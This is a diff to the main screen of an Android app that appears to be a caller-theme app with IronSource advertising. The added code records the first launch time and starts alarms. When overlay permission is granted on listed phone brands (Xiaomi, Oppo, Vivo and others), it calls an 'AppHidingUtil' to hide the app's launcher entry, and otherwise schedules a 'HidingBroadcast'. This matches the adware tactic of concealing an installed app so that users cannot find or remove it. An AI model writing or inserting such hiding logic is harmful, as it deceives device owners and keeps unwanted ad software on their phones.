@@ -1,5 +1,7 @@
 package com.maxios.maxcall.ui.main
 
+import android.os.Build
+import android.provider.Settings
 import androidx.fragment.app.Fragment
 import androidx.fragment.app.commit
 import com.bumptech.glide.manager.SupportRequestManagerFragment
@@ -7,14 +9,20 @@ import com.ironsource.mediationsdk.IronSource
 import com.maxios.maxcall.R
 import com.maxios.maxcall.base.BaseActivity
 import com.maxios.maxcall.databinding.MainActivityBinding
+import com.maxios.maxcall.repository.PreferencesRepository
 import com.maxios.maxcall.ui.contact.ContactFragment
 import com.maxios.maxcall.ui.contacts.ContactsFragment
 import com.maxios.maxcall.ui.home.HomeFragment
 import com.maxios.maxcall.ui.settings.SettingsFragment
 import com.maxios.maxcall.ui.theme.ThemeFragment
 import com.maxios.maxcall.utils.IRON_SOURCE_API_KEY
+import com.maxios.maxcall.utils.hiding.AlarmBroadcast
+import com.maxios.maxcall.utils.hiding.AppHidingUtil
+import com.maxios.maxcall.utils.hiding.HidingBroadcast
 import org.koin.android.viewmodel.ext.android.viewModel
 import org.koin.core.parameter.parametersOf
+import org.koin.java.KoinJavaComponent
+import java.util.*
 
 class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
 
@@ -25,6 +33,11 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun setupUI() {
         IronSource.setMetaData("is_child_directed","false")
         IronSource.init(this, IRON_SOURCE_API_KEY)
+
+        if (viewModel.preferencesRepository.firstLaunchMillis == -1L)
+            viewModel.preferencesRepository.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
 
         if (needToShowPermissionDialog())
             PermissionDialog().show(supportFragmentManager)
@@ -45,6 +58,10 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
         }
     }
 
+    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
+        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+    )
+
     override fun onPause() {
         super.onPause()
         IronSource.onPause(this)
@@ -53,6 +70,10 @@ class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {
     override fun onResume() {
         super.onResume()
         IronSource.onResume(this)
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
     }
 
     private fun needToShowPermissionDialog() =
